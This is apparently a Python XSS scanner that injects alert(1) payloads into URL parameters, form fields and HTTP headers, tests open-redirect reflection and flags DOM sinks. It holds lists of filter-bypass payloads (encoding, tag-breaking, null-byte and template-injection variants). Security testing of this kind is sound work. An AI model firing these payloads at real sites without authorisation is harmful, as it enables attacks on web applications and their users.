"""
Advanced XSS Scanner
Tests: reflected, DOM-based, form-based, header injection, encoding bypasses
"""
import requests
import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings()

UA = "Mozilla/5.0 (Security Scanner)"

# ── Payloads ──────────────────────────────────────────────────────────────────
# Basic
BASIC = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
]

# Filter bypass payloads
BYPASS = [
    # Case variation
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # Tag breaking
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # Event handlers
    "\" onmouseover=\"alert(1)\" x=\"",
    "' onmouseover='alert(1)' x='",
    "\" onfocus=\"alert(1)\" autofocus x=\"",
    # JS protocol
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    # Encoding tricks
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "\x3cscript\x3ealert(1)\x3c/script\x3e",
    # Template injection that can lead to XSS
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # Null bytes
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    # Angular/Vue
    "{{constructor.constructor('alert(1)')()}}",
    "<div ng-app ng-csp><input ng-focus=$event.view.alert(1) autofocus>",
]

# Attribute-context payloads
ATTR_PAYLOADS = [
    "\" onmouseover=\"alert(1)",
    "' onmouseover='alert(1)",
    "\" autofocus onfocus=\"alert(1)",
    "\"><img src=x onerror=alert(1)>",
    "'\"><svg onload=alert(1)>",
]

# Header-based XSS
HEADER_PAYLOADS = {
    "User-Agent":  "<script>alert(1)</script>",
    "Referer":     "https://example.com/<script>alert(1)</script>",
    "X-Forwarded-For": "<script>alert(1)</script>",
    "Accept-Language": "<script>alert(1)</script>",
}

# DOM XSS sinks — dangerous JS patterns
DOM_SINKS = [
    ("document.write(",       "critical"),
    ("document.writeln(",     "critical"),
    (".innerHTML",            "high"),
    (".outerHTML",            "high"),
    ("eval(",                 "high"),
    ("setTimeout(",           "medium"),
    ("setInterval(",          "medium"),
    ("location.href",         "medium"),
    ("location.replace(",     "medium"),
    ("location.assign(",      "medium"),
    (".insertAdjacentHTML(",  "high"),
    ("$.parseHTML(",          "medium"),
    ("$(",                    "low"),  # jQuery with unescaped input
]

# DOM XSS sources — untrusted input
DOM_SOURCES = [
    "location.hash",
    "location.search",
    "location.href",
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.name",
]

# ── Helpers ───────────────────────────────────────────────────────────────────
def _get(url, params=None, headers=None, timeout=6):
    h = {"User-Agent": UA}
    if headers:
        h.update(headers)
    try:
        r = requests.get(url, params=params, headers=h,
                         timeout=timeout, verify=False, allow_redirects=True)
        return r
    except Exception:
        return None

def _post(url, data, headers=None, timeout=6):
    h = {"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    try:
        r = requests.post(url, data=data, headers=h,
                          timeout=timeout, verify=False, allow_redirects=True)
        return r
    except Exception:
        return None

def payload_reflected(response_text, payload):
    """Check if payload or a variant of it appears in the response."""
    if not response_text:
        return False
    checks = [
        payload,
        payload.lower(),
        payload.replace('"', '&quot;'),
        payload.replace('<', '&lt;'),
    ]
    for c in checks:
        if c.lower() in response_text.lower():
            return True
    return False

def is_executable(response_text, payload):
    """Check if payload lands in an executable context (not just reflected as escaped text)."""
    if not response_text:
        return False
    # If it's HTML-escaped it's safe — check for raw unescaped version
    escaped = payload.replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')
    raw_present = payload in response_text
    escaped_present = escaped in response_text
    return raw_present and not escaped_present


# ── 1. Reflected XSS via URL parameters ──────────────────────────────────────
def test_url_params(url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    base   = url.split('?')[0]

    # If no params, try common ones
    test_params = list(params.keys()) if params else ["q","s","search","query","id","name","page","input","text","term","keyword","url","redirect","next","data","value","msg","message","comment","user","pass","email","token","ref","cat","type","view"]

    for param in test_params[:8]:
        for payload in BASIC + BYPASS[:6]:
            r = _get(base, params={param: payload})
            if r and payload_reflected(r.text, payload):
                executable = is_executable(r.text, payload)
                findings.append({
                    "type":      "reflected_xss_get",
                    "param":     param,
                    "payload":   payload,
                    "url":       f"{base}?{param}={requests.utils.quote(payload)}",
                    "message":   f"Reflected XSS in GET param '{param}'" + (" — payload executes unescaped" if executable else " — reflected but may be escaped"),
                    "severity":  "critical" if executable else "high",
                    "context":   "url_parameter",
                })
                break  # one confirmed hit per param is enough
    return findings


# ── 2. Form-based XSS (GET and POST forms) ───────────────────────────────────
def test_forms(url):
    findings = []
    r = _get(url)
    if not r:
        return findings

    soup = BeautifulSoup(r.text, "html.parser")
    forms = soup.find_all("form")

    for form in forms[:5]:
        action  = form.get("action","")
        method  = form.get("method","get").lower()
        form_url = urljoin(url, action) if action else url

        inputs = form.find_all(["input","textarea","select"])
        field_names = []
        for inp in inputs:
            name = inp.get("name")
            itype = inp.get("type","text").lower()
            if name and itype not in ("submit","button","image","file","hidden","checkbox","radio"):
                field_names.append(name)

        if not field_names:
            continue

        for payload in BASIC[:4] + ATTR_PAYLOADS[:2]:
            data = {f: payload for f in field_names}
            if method == "post":
                resp = _post(form_url, data)
            else:
                resp = _get(form_url, params=data)

            if resp and payload_reflected(resp.text, payload):
                executable = is_executable(resp.text, payload)
                findings.append({
                    "type":    f"reflected_xss_{method}_form",
                    "param":   ", ".join(field_names),
                    "payload": payload,
                    "url":     form_url,
                    "message": f"XSS in {method.upper()} form field(s): {', '.join(field_names)}" + (" — unescaped" if executable else ""),
                    "severity":"critical" if executable else "high",
                    "context": f"form_{method}",
                })
                break

    return findings


# ── 3. DOM XSS analysis ───────────────────────────────────────────────────────
def test_dom_xss(url):
    findings = []
    r = _get(url)
    if not r:
        return findings
    text = r.text

    # Find sinks
    for sink, sev in DOM_SINKS:
        if sink in text:
            # Check if a DOM source is nearby (within 500 chars)
            idx = 0
            while True:
                pos = text.find(sink, idx)
                if pos == -1:
                    break
                snippet = text[max(0,pos-300):pos+300]
                nearby_source = next((src for src in DOM_SOURCES if src in snippet), None)
                if nearby_source:
                    findings.append({
                        "type":    "dom_xss",
                        "message": f"DOM XSS: sink '{sink}' used near source '{nearby_source}'",
                        "severity": sev,
                        "context": "dom",
                        "snippet": snippet.strip()[:120],
                    })
                    break
                idx = pos + 1

    # Also flag sinks without proven source (lower severity)
    for sink, sev in DOM_SINKS[:4]:
        if sink in text and not any(f.get("context")=="dom" and sink in f.get("message","") for f in findings):
            findings.append({
                "type":    "dom_sink",
                "message": f"Potentially unsafe DOM sink: {sink}",
                "severity":"low",
                "context": "dom",
            })

    return findings


# ── 4. HTTP header injection ──────────────────────────────────────────────────
def test_header_xss(url):
    findings = []
    for header, payload in HEADER_PAYLOADS.items():
        r = _get(url, headers={header: payload})
        if r and payload_reflected(r.text, payload):
            executable = is_executable(r.text, payload)
            findings.append({
                "type":    "header_xss",
                "param":   header,
                "payload": payload,
                "url":     url,
                "message": f"XSS via HTTP header '{header}' — server reflects header value",
                "severity":"high" if executable else "medium",
                "context": "http_header",
            })
    return findings


# ── 5. Open redirect → XSS ───────────────────────────────────────────────────
def test_open_redirect(url):
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    redirect_params = [p for p in (list(params.keys()) + ["redirect","next","url","return","returnUrl","goto","dest","destination","continue","ref"]) if p]

    for param in redirect_params[:4]:
        payload = "javascript:alert(1)"
        r = _get(url.split("?")[0], params={param: payload})
        if r:
            # Check if payload lands in href or src attribute
            if payload in (r.text or ""):
                findings.append({
                    "type":    "open_redirect_xss",
                    "param":   param,
                    "payload": payload,
                    "url":     f"{url.split('?')[0]}?{param}={payload}",
                    "message": f"Open redirect param '{param}' reflects javascript: URI — potential XSS",
                    "severity":"high",
                    "context": "redirect",
                })
    return findings


# ── Main entry point ──────────────────────────────────────────────────────────
def scan_xss(url):
    results = []

    try:
        results += test_url_params(url)
    except Exception:
        pass

    try:
        results += test_forms(url)
    except Exception:
        pass

    try:
        results += test_dom_xss(url)
    except Exception:
        pass

    try:
        results += test_header_xss(url)
    except Exception:
        pass

    try:
        results += test_open_redirect(url)
    except Exception:
        pass

    # Deduplicate by (type, param, payload)
    seen = set()
    unique = []
    for r in results:
        key = (r.get("type"), r.get("param"), r.get("payload","")[:40])
        if key not in seen:
            seen.add(key)
            unique.append(r)

    # Sort by severity
    order = {"critical":0,"high":1,"medium":2,"low":3}
    unique.sort(key=lambda x: order.get(x.get("severity","low"), 3))

    return unique
